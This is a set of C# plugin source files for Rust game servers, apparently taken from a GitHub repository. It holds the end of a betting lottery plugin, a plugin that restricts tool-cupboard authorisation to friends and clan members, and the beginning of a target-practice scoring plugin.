                win.AddRange(ChangeBonusPage(minfrom, maxfrom));
            }

            var elements = new CuiElementContainer();
#region background
            var container = elements.Add(new CuiPanel
            {
                Image =
                {
                    Color = "0.1 0.1 0.1 1"
                },
                RectTransform =
                {
                    AnchorMin = "0 0.2",
                    AnchorMax = "0.8 0.8"
                },
                CursorEnabled = true
            }, "Hud", "container");
#endregion
#region closebutton
            var closeButton = new CuiButton
            {
                Button =
                {
                    Command = "cmdDestroyUI",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                RectTransform =
                {
                    AnchorMin = "0.86 0.92",
                    AnchorMax = "0.97 0.98"
                },
                Text =
                {
                    Text = "X",
                    FontSize = 22,
                    Align = TextAnchor.MiddleCenter
                }
            };
            elements.Add(closeButton, container);
#endregion
#region currency
            elements.Add(new CuiLabel
            {
                Text =
                {
                    Text = string.Format(lang.GetMessage("Balance", this, player.UserIDString), currentBalance.ToString(CultureInfo.CurrentCulture)),
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.1 0.91",
                    AnchorMax = "0.9 0.98"
                }
            }, container);
#endregion
#region multiplier
            elements.Add(new CuiLabel
            {
                Text =
                {
                    Text = "Multiplier : x" + playerbet.multiplicator,
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.05 0.81",
                    AnchorMax = "0.15 0.88"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdLess",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "-",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.2 0.81",
                    AnchorMax = "0.3 0.88"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdPlus",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "+",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.31 0.81",
                    AnchorMax = "0.41 0.88"
                }
            }, container);
#endregion
#region bet
            elements.Add(new CuiLabel
            {
                Text =
                {
                    Text = "Bet modifiers :",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.05 0.61",
                    AnchorMax = "0.15 0.68"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdBet 1",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "+1",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.05 0.51",
                    AnchorMax = "0.15 0.58"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdBet 5",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "+5",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.155 0.51",
                    AnchorMax = "0.255 0.58"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdBet 10",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "+10",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.26 0.51",
                    AnchorMax = "0.36 0.58"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdBet 100",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "+100",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.365 0.51",
                    AnchorMax = "0.485 0.58"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdBet 1000",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "+1000",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.05 0.41",
                    AnchorMax = "0.15 0.48"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdBet 10000",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "+10000",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.155 0.41",
                    AnchorMax = "0.255 0.48"
                }
            }, container);
            elements.Add(new CuiButton
            {
                Button =
                {
                    Command = "cmdPlaceBet",
                    Close = container,
                    Color = "0.8 0.8 0.8 0.2"
                },
                Text =
                {
                    Text = "Place Bet",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.05 0.31",
                    AnchorMax = "0.255 0.38"
                }
            }, container);
#endregion
#region winpart
            elements.Add(new CuiLabel
            {
                Text =
                {
                    Text = string.Format(lang.GetMessage("CurrentBet", this, player.UserIDString), playerbet.currentbet*playerbet.multiplicator),
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.71 0.71",
                    AnchorMax = "0.99 0.81"
                }
            }, container);

            if (UseSR && ServerRewards.IsLoaded)
            {
                var mini = string.Format(lang.GetMessage("MinimumSRBet", this, player.UserIDString), MinBetjackpot, SRjackpot);
                elements.Add(new CuiLabel
                {
                    Text =
                    {
                        Text = mini,
                        FontSize = 18,
                        Align = TextAnchor.MiddleCenter
                    },
                    RectTransform =
                    {
                        AnchorMin = "0.71 0.39",
                        AnchorMax = "0.99 0.59"
                    }
                }, container);
            }
            else
            {
                elements.Add(new CuiLabel
                {
                    Text =
                    {
                        Text = string.Format(lang.GetMessage("Roll", this, player.UserIDString), JackpotNumber, jackpots),
                        FontSize = 18,
                        Align = TextAnchor.MiddleCenter
                    },
                    RectTransform =
                    {
                        AnchorMin = "0.71 0.39",
                        AnchorMax = "0.99 0.59"
                    }
                }, container);
            }
#endregion
            CuiHelper.AddUi(player, elements);
            CuiHelper.AddUi(player, win);
            Currentbet.Remove(player.userID);
            Currentbet.Add(player.userID, playerbet);
            SaveData(Currentbet);
        }
        
        private static CuiElementContainer ChangeBonusPage(int pageless, int pagemore)
        {
            return new CuiElementContainer
            {
                {
                    new CuiButton
                    {
                        Button = {Command = $"cmdPage page {pageless}", Color = "0.5 0.5 0.5 0.2"},
                        RectTransform = {AnchorMin = "0.83 0.25", AnchorMax = "0.91 0.3"},
                        Text = {Text = "<<", FontSize = 20, Align = TextAnchor.MiddleCenter}
                    },
                    "Hud",
                    "ButtonBack"
                },
                {
                    new CuiButton
                    {
                        Button = {Command = $"cmdPage page {pagemore}", Color = "0.5 0.5 0.5 0.2"},
                        RectTransform = {AnchorMin = "0.92 0.25", AnchorMax = "1 0.30"},
                        Text = {Text = ">>", FontSize = 20, Align = TextAnchor.MiddleCenter}
                    },
                    "Hud",
                    "ButtonForward"
                }
            };
        }
        #endregion

        #region reward
        public double FindReward(BasePlayer player, int bet, int reference, int multiplicator = 1)
        {
            int findReward = 0;
            float reward = 0;
            int[] number = GetIntArray(reference);
            string newreference;
            if (UseSR && ServerRewards.IsLoaded)
            {
                #region jackpot

                if (reference == SRJackpotNumber)
                {
                    if (bet*multiplicator >= MinBetjackpot)
                    {
                        findReward = findReward*multiplicator + (int) SRjackpot;
                        return findReward;
                    }
                    else
                    {
                        SendReply(player, string.Format(lang.GetMessage("BetMore", this, player.UserIDString), MinBetjackpot));
                    }
                }

                #endregion

                #region full_match
                    if (DefaultBasePoint.Contains(reference.ToString()))
                    {
                        SRWinRates.TryGetValue("Match4Number", out findReward);
                        return findReward*multiplicator;
                    }

                #endregion

                #region three_match

                newreference = number[0].ToString() + number[1].ToString() + number[2].ToString() + "x";
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match3Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = number[0].ToString() + number[1].ToString() + "x" + number[3].ToString();
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match4Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = number[0].ToString() + "x" + number[2].ToString() + number[3].ToString();
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match4Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = "x" + number[1].ToString() + number[2].ToString() + number[3].ToString();
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match4Number", out findReward);
                    return findReward*multiplicator;
                }

                #endregion

                #region two_match

                newreference = number[0].ToString() + number[1].ToString() + "x" + "x";
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match2Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = number[0].ToString() + "x" + "x" + number[3].ToString();
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match2Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = "x" + "x" + number[2].ToString() + number[3].ToString();
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match2Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = number[0].ToString() + "x" + number[2].ToString() + "x";
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match2Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = "x" + number[1].ToString() + "x" + number[3].ToString();
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match2Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = "x" + number[1].ToString() + number[2].ToString() + "x";
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match2Number", out findReward);
                    return findReward*multiplicator;
                }

                #endregion

                #region one_match

                newreference = number[0].ToString() + "x" + "x" + "x";
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match1Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = "x" + number[1].ToString() + "x" + "x";
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match1Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = "x" + "x" + number[2].ToString() + "x";
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match1Number", out findReward);
                    return findReward*multiplicator;
                }
                newreference = "x" + "x" + "x" + number[3].ToString();
                if (DefaultBasePoint.Contains(newreference))
                {
                    SRWinRates.TryGetValue("Match1Number", out findReward);
                    return findReward*multiplicator;
                }

                #endregion

            }
            else
            {
                #region jackpot
                if (reference == JackpotNumber)
                {
                    int jackpots = (int) Math.Round(Currentbet.Sum(v => v.Value.totalbet));
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator + jackpots + jackpot;
                }
                #endregion

                #region full_match
                if (IndividualRates.ContainsKey(reference.ToString()))
                {
                    IndividualRates.TryGetValue(number.ToString(), out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                #endregion

                #region three_match
                newreference = number[0].ToString() + number[1].ToString() + number[2].ToString() + "x";
                IndividualRates.TryGetValue(newreference, out findReward);

                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference = number[0].ToString() + number[1].ToString() + "x" + number[3].ToString();
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference = number[0].ToString() + "x" + number[2].ToString() + number[3].ToString();
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference =  "x" + number[1].ToString() + number[2].ToString() + number[3].ToString();
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                #endregion

                #region two_match
                newreference = number[0].ToString() + number[1].ToString() + "x" + "x";
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference = number[0].ToString() + "x" + "x" + number[3].ToString();
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference =  "x" + "x" + number[2].ToString() + number[3].ToString();
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference = number[0].ToString() + "x" + number[2].ToString() + "x";
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference = "x" + number[1].ToString() + "x" + number[3].ToString();
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference =  "x" + number[1].ToString() + number[2].ToString() + "x";
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
               #endregion

                #region one_match
                newreference = number[0].ToString() + "x" + "x" + "x";
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference =  "x" + number[1].ToString() + "x" + "x";
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference =  "x" + "x" + number[2].ToString() + "x";
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
                newreference = "x" + "x" + "x" + number[3].ToString();
                if(IndividualRates.ContainsKey(newreference))
                {
                    IndividualRates.TryGetValue(newreference, out findReward);
                    return bet*(Math.Round((double)findReward/100, 2)) * multiplicator;
                }
    #endregion
            }

            return findReward;
        }
        #endregion

        #region Command
        [ChatCommand("lot")]
        private void cmdLotery(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.UserIDString, "Lottery.canuse"))
            {
                SendReply(player, string.Format(lang.GetMessage("NoPerm", this, player.UserIDString)));
                return;
            }
            ShowLotery(player, null);
        }

        [ConsoleCommand("cmdDestroyUI")]
        void cmdDestroyUI(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null) return;
            GUIDestroy(arg.Player());
        }

        [ConsoleCommand("cmdLess")]
        void cmdLess(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null) return;
            GUIDestroy(arg.Player());
            ShowLotery(arg.Player(), new[] {"less", "-1"});
        }

        [ConsoleCommand("cmdBet")]
        void cmdBet(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null) return;
            GUIDestroy(arg.Player());
            ShowLotery(arg.Player(), new[] {"bet", arg.Args[0]});
        }

        [ConsoleCommand("cmdPlus")]
        void cmdPlus(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null) return;
            GUIDestroy(arg.Player());
            ShowLotery(arg.Player(), new[] {"plus", "1"});
        }

        [ConsoleCommand("cmdPage")]
        void cmdPage(ConsoleSystem.Arg arg)
        {
            if (arg.Player() == null) return;
            GUIDestroy(arg.Player());
            ShowLotery(arg.Player(), new[] {"page", arg.Args[1]});
        }

        [ConsoleCommand("cmdPlaceBet")]
        void cmdPlaceBet(ConsoleSystem.Arg arg)
        {
            Dictionary<ulong, playerinfo> playerinfos = new Dictionary<ulong, playerinfo>();
            GUIDestroy(arg.Player());
            if (arg.Player() == null) return;

            playerinfo playerbet = new playerinfo();
            if (!Currentbet.ContainsKey(arg.Player().userID))
            {
                Currentbet.Add(arg.Player().userID, new playerinfo());
            }
            else
            {
                Currentbet.TryGetValue(arg.Player().userID, out playerbet);
            }
            if (playerbet.currentbet == 0)
            {
                SendReply(arg.Player(), lang.GetMessage("NoBet", this, arg.Player().UserIDString));
                return;
            }
            int random = UnityEngine.Random.Range(DefaultMinRange, DefaultMaxRange);
            if (UseSR && ServerRewards.IsLoaded)
            {
                if (SRMinBet <= playerbet.currentbet*playerbet.multiplicator)
                {
                    double reward = FindReward(arg.Player(), (int)playerbet.currentbet, random, playerbet.multiplicator);
                    if(playerbet.currentbet*playerbet.multiplicator >= MinBetjackpot)
                        if (random == SRJackpotNumber)
                        {
                            foreach (var resetbet in Currentbet)
                            {
                                resetbet.Value.totalbet = 0;
                                resetbet.Value.multiplicator = 1;
                                playerinfos.Add(resetbet.Key, resetbet.Value);
                            }
                            Currentbet.Clear();
                            Currentbet = playerinfos;
                            ServerRewards?.Call("AddPoints", new object[] { arg.Player().userID, reward });
                            SendReply(arg.Player(), string.Format(lang.GetMessage("Jackpot", this, arg.Player().UserIDString), random, reward));
                            return;
                        }
                    if (reward != 0 && random != SRJackpotNumber)
                    {
                        Currentbet.Remove(arg.Player().userID);
                        Currentbet.Add(arg.Player().userID, playerbet);
                        ServerRewards?.Call("AddPoints", new object[] { arg.Player().userID, reward });
                        SendReply(arg.Player(), string.Format(lang.GetMessage("WinPoints", this, arg.Player().UserIDString), random, reward));
                    }
                    else if (reward == 0)
                    {
                        SendReply(arg.Player(), string.Format(lang.GetMessage("NoWin", this, arg.Player().UserIDString), random));
                    }
                    else
                    {
                        ServerRewards?.Call("AddPoints", new object[] { arg.Player().userID, reward });
                        SendReply(arg.Player(), string.Format(lang.GetMessage("WinPoints", this, arg.Player().UserIDString), random, reward));
                    }

                    playerbet.totalbet += playerbet.currentbet*(10/100.0);
                    Economy?.CallHook("Withdraw", arg.Player().userID, playerbet.currentbet*playerbet.multiplicator);
                    playerbet.currentbet = 0;
                    playerbet.multiplicator = 1;
                }
                else
                {
                    SendReply(arg.Player(), string.Format(lang.GetMessage("MiniSRBet", this, arg.Player().UserIDString), SRMinBet));
                }
            }
            else
            {
                double reward = FindReward(arg.Player(), (int)playerbet.currentbet, random, playerbet.multiplicator);
                if (random == JackpotNumber)
                {
                    foreach (var resetbet in Currentbet)
                    {
                        resetbet.Value.totalbet = 0;
                        resetbet.Value.multiplicator = 1;
                        playerinfos.Add(resetbet.Key, resetbet.Value);
                    }
                    Currentbet.Clear();
                    Currentbet = playerinfos;
                    Economy?.CallHook("Deposit", arg.Player().userID, reward);
                    SendReply(arg.Player(), string.Format(lang.GetMessage("Jackpot", this, arg.Player().UserIDString), random, reward));
                }
                else if (reward != 0 && random != JackpotNumber)
                {
                    Currentbet.Remove(arg.Player().userID);
                    Currentbet.Add(arg.Player().userID, playerbet);
                    Economy?.CallHook("Deposit", arg.Player().userID, reward);
                    SendReply(arg.Player(), string.Format(lang.GetMessage("Win", this, arg.Player().UserIDString), random, reward));
                }
                else if (reward == 0)
                {
                    SendReply(arg.Player(), lang.GetMessage("NoWin", this, arg.Player().UserIDString));
                }
                else
                {
                    Economy?.CallHook("Deposit", arg.Player().userID, reward);
                    SendReply(arg.Player(), string.Format(lang.GetMessage("Win", this, arg.Player().UserIDString), random, reward));
                }

                playerbet.totalbet += playerbet.currentbet*(10/100.0);
                Economy?.CallHook("Withdraw", arg.Player().userID, playerbet.currentbet*playerbet.multiplicator);
                playerbet.currentbet = 0;
                playerbet.multiplicator = 1;
            }
            SaveData(Currentbet);
        }

        #endregion
    }
}

// --- End of file: Lottery.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/CupboardForFriends.cs ---
// --- Original Local Path: CupboardForFriends.cs ---

using System.Collections.Generic;
using System.Linq;

namespace Oxide.Plugins
{
    [Info("Cupboard for Friends", "LaserHydra", "1.2.4", ResourceId = 1578)]
    [Description("Only allow friends of already authorized people to authorize themselves.")]
    class CupboardForFriends : RustPlugin
    {
        bool debug = false;

        bool blockDamage = false;

        RustPlugin FriendsAPI;
        RustPlugin Clans;

        ////////////////////////////////////////
        ///     On Plugin Loaded
        ////////////////////////////////////////

        void Loaded()
        {
            FriendsAPI = (RustPlugin) plugins.Find("Friends");
            Clans = (RustPlugin) plugins.Find("Clans");

            LoadMessages();
            LoadConfig();

            if (FriendsAPI == null)
                PrintError($"FriendsAPI could not be found! You need to have FriendsAPI installed for the plugin '{this.Title}' to work! Get it here: http://oxidemod.org/plugins/686/");

            if (Clans == null)
                PrintWarning($"Clans could not be found! Clans is an OPTIONAL addition for '{this.Title}'! Get it here: http://oxidemod.org/plugins/842/");

            if(Config["Settings", "Block Damage"] != null)
                blockDamage = (bool)Config["Settings", "Block Damage"];
        }

        void OnPluginLoaded(object plugin)
        {
            if(plugin.GetType().BaseType == typeof(RustPlugin))
            {
                RustPlugin rustPlugin = (RustPlugin) plugin;

                if (rustPlugin.Title == "Friends")
                    FriendsAPI = rustPlugin;

                if (rustPlugin.Title == "Clans")
                    Clans = rustPlugin;
            }
        }

        ////////////////////////////////////////
        ///     Config & Message Loading
        ////////////////////////////////////////

        void LoadMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                {"Blocked Authorization", "You can not authorize yourself or clear the list of this cupboard as none of the authorized players has you on his friendlist! You can be added as friend by typing /friend add <your name>"},
                {"Blocked Damage", "You can not damage this cupboard as none of the authorized players has you on his friendlist! You can be added as friend by typing /friend add <your name>"}
            }, this);
        }

        new void LoadConfig()
        {
            SetConfig("Settings", "Block Damage", true);

            SaveConfig();
        }

        protected override void LoadDefaultConfig()
        {
            PrintWarning("Generating new config file...");
        }

        ////////////////////////////////////////
        ///    Subject Related
        ////////////////////////////////////////

        void OnEntityTakeDamage(BaseCombatEntity vic, HitInfo info)
        {
            if (!blockDamage)
                return;

            if (vic != null && vic is BuildingPrivlidge && info != null && info?.Initiator != null && info?.Initiator?.ToPlayer() != null)
            {
                object blocked = TestForFriends((BuildingPrivlidge) vic, info.Initiator.ToPlayer(), true);
                info.damageTypes.Scale(Rust.DamageType.Heat, 0f);

                if (blocked != null)
                {
                    info?.damageTypes?.ScaleAll(0f);
                    info.HitBone = 0;
                    info.HitEntity = null;
                    info.material = new UnityEngine.PhysicMaterial();
                    info.DidHit = false;
                    info.DoHitEffects = false;

                    SendChatMessage(info.Initiator.ToPlayer(), GetMsg("Blocked Damage", info.Initiator.ToPlayer().UserIDString));
                }
            }
        }

        object OnCupboardClearList(BuildingPrivlidge priviledge, BasePlayer player) => TestForFriends(priviledge, player);

        object OnCupboardAuthorize(BuildingPrivlidge priviledge, BasePlayer player) => TestForFriends(priviledge, player);

        object TestForFriends(BuildingPrivlidge priviledge, BasePlayer player, bool isDamage = false)
        {
            DevMsg($"-------------------------------------------");
            DevMsg($"Any authed: {priviledge.AnyAuthed()}");

            if (FriendsAPI != null && priviledge.AnyAuthed())
            {
                bool isFriend = false;

                List<string> ids = (from id in priviledge.authorizedPlayers
                                    select id.userid.ToString()).ToList();

                foreach (string uid in ids)
                {
                    DevMsg($"------------------------");
                    DevMsg($"Current uid: {uid}");

                    if (IsFriend(player, uid))
                    {
                        DevMsg($"Found Friend: {uid}");
                        isFriend = true;
                    }
                    else if (Clans != null && IsClanMember(player, uid))
                    {
                        DevMsg($"Found Clanmember: {uid}");
                        isFriend = true;
                    }
                }

                DevMsg($"isFriend: {isFriend}");

                if (!isFriend)
                {
                    if (!isDamage)
                        SendChatMessage(player, GetMsg("Blocked Authorization", player.UserIDString));

                    return false;
                }
            }

            return null;
        }

        ////////////////////////////////////////
        ///     Friends API
        ////////////////////////////////////////

        bool IsFriend(BasePlayer player, string friendID)
        {
            if (FriendsAPI == null)
                return true;

            bool isFriend = (bool)(FriendsAPI.Call("HasFriendS", friendID, player.UserIDString) ?? false);

            DevMsg($"IsFriend({player}, {friendID})");
            DevMsg($"IsFriend: returning {isFriend}");

            return isFriend;
        }

        bool IsClanMember(BasePlayer player, string targetID)
        {
            if (Clans == null)
                return false;

            string playerClan = (string)Clans.Call("GetClanOf", player.UserIDString) ?? "";
            string targetClan = (string)Clans.Call("GetClanOf", targetID) ?? "";

            DevMsg($"{player.displayName}: '{playerClan}' (Length: {playerClan.Length}), {targetID}: '{targetClan}' (Length: {targetClan.Length})");

            bool isClanMember = (playerClan == "" || targetClan == "") ? false : playerClan == targetClan;

            DevMsg($"IsClanMember({player}, {targetID})");
            DevMsg($"IsClanMember: returning {isClanMember}");

            return isClanMember;
        }

        ////////////////////////////////////////
        ///     Converting
        ////////////////////////////////////////

        string ListToString(List<string> list, int first, string seperator) => string.Join(seperator, list.Skip(first).ToArray());

        ////////////////////////////////////////
        ///     Config & Message Related
        ////////////////////////////////////////

        void SetConfig(params object[] args)
        {
            List<string> stringArgs = (from arg in args select arg.ToString()).ToList<string>();
            stringArgs.RemoveAt(args.Length - 1);

            if (Config.Get(stringArgs.ToArray()) == null) Config.Set(args);
        }

        string GetMsg(string key, string userID = null) => lang.GetMessage(key, this, userID);

        ////////////////////////////////////////
        ///     Chat Handling
        ////////////////////////////////////////

        void DevMsg(string prefix, string msg = null)
        {
            if (debug && BasePlayer.FindByID(76561198111997160) != null)
                BasePlayer.FindByID(76561198111997160).ConsoleMessage(msg == null ? prefix : "<color=#00FF8D>" + prefix + "</color>: " + msg);
        }

        void SendChatMessage(BasePlayer player, string prefix, string msg = null) => SendReply(player, msg == null ? prefix : "<color=#00FF8D>" + prefix + "</color>: " + msg);
    }
}

// --- End of file: CupboardForFriends.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/TargetPractice.cs ---
// --- Original Local Path: TargetPractice.cs ---

using System;
using System.Collections.Generic;
using UnityEngine;
using Oxide.Core.Configuration;
using Oxide.Core;
using System.Linq;
using Oxide.Game.Rust.Cui;
using System.Reflection;



namespace Oxide.Plugins
{
    [Info("TargetPractice", "k1lly0u", "0.1.55", ResourceId = 1731)]
    class TargetPractice : RustPlugin
    {
        TargetData shotData;
        private DynamicConfigFile ShotData;

        private static Vector2 position = new Vector2(0.75f, 0.2f);
        private static Vector2 dimension = new Vector2(0.25f, 0.07f);
        private Dictionary<ulong, PlayerMSG> currentHits = new Dictionary<ulong, PlayerMSG>();

        FieldInfo knockdownMaxValue = typeof(ReactiveTarget).GetField("knockdownHealth", (BindingFlags.Instance | BindingFlags.NonPublic));

        #region oxide hooks
        void Loaded()
        {     
            lang.RegisterMessages(messages, this);
            ShotData = Interface.Oxide.DataFileSystem.GetFile("targetpractice_scores");
        }
        void OnServerInitialized()
        {
            LoadVariables();
            LoadData();
            LoadTargets();
            timer.Once(saveTimer * 60, () => SaveLoop());
        }
        protected override void LoadDefaultConfig()
        {
            Puts("Creating a new config file");
            Config.Clear();
            LoadVariables();
        }
        void Unload() => SaveData();        
               
        void OnEntityTakeDamage(BaseCombatEntity entity, HitInfo hitinfo)
        {
            try
            {                
                if (entity is ReactiveTarget && hitinfo.Initiator is BasePlayer)
                {
                              
                    var target = (ReactiveTarget)entity;
                    var attacker = (BasePlayer)hitinfo.Initiator;
                    if (entity != null && attacker != null)
                    {
                        float distance = GetPlayerDistance(entity.transform.position, attacker.transform.position); 
                        string hit = lang.GetMessage("hit", this, attacker.UserIDString);
                                                
                        CheckPlayerData(attacker);

                        var data = shotData.longShot;
                        var time = data[attacker.userID].PopupTime;

                        string weapon = FormatWeapon(attacker.GetActiveItem());
                        if (weapon == "Flame Thrower" && disableFlamer) return;
                        if (hitinfo.HitBone == StringPool.Get("target_collider_bullseye"))
                        {
                            hit = lang.GetMessage("bullseye", this, attacker.UserIDString);
                            if (data[attacker.userID].Bullseye < distance) { data[attacker.userID].Bullseye = distance; data[attacker.userID].Weapon = weapon; }
                        }
                        else if (data[attacker.userID].Range < distance) { data[attacker.userID].Range = distance; data[attacker.userID].Weapon = weapon; }

                        if (distance > shotData.bestHit.Range)
                        {
                            shotData.bestHit.Name = attacker.displayName;
                            shotData.bestHit.Range = distance;
                            shotData.bestHit.Weapon = attacker.GetActiveItem().info.displayName.english;
                            if (broadcastNewScore)
                                BroadcastToAll(attacker.displayName, distance.ToString(), weapon);
                        }
                        if (target.IsKnockedDown())
                        {
                            target.CancelInvoke("ResetTarget");
                            target.health = target.MaxHealth();
                            target.SendNetworkUpdate();
                            timer.Once(time, () => target.SetFlag(BaseEntity.Flags.On, true));
                        }

                        if (!currentHits.ContainsKey(attacker.userID)) currentHits.Add(attacker.userID, new PlayerMSG());
                        currentHits[attacker.userID].msg = hit;
                        currentHits[attacker.userID].distance = distance;
                        OverwriteDuplicate(attacker);
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
        private string FormatWeapon(Item weapon)
        {
            string weaponstring = weapon.info.displayName.english;
            string formattedWeapon = "";
            List<string> mods = new List<string>();
            if (weapon.contents != null)
                foreach (var mod in weapon.contents.itemList)
                    mods.Add(mod.info.shortname);
            if (mods.Count > 0)
            {
                if (mods.Contains("weapon.mod.silencer"))
                    formattedWeapon = "Silenced ";
                if (mods.Contains("weapon.mod.holosight"))
                    formattedWeapon = formattedWeapon + "Sighted ";
                if (mods.Contains("weapon.mod.lasersight"))
                    if (!formattedWeapon.Contains("Sighted"))
                        formattedWeapon = formattedWeapon + "Laser Sighted ";
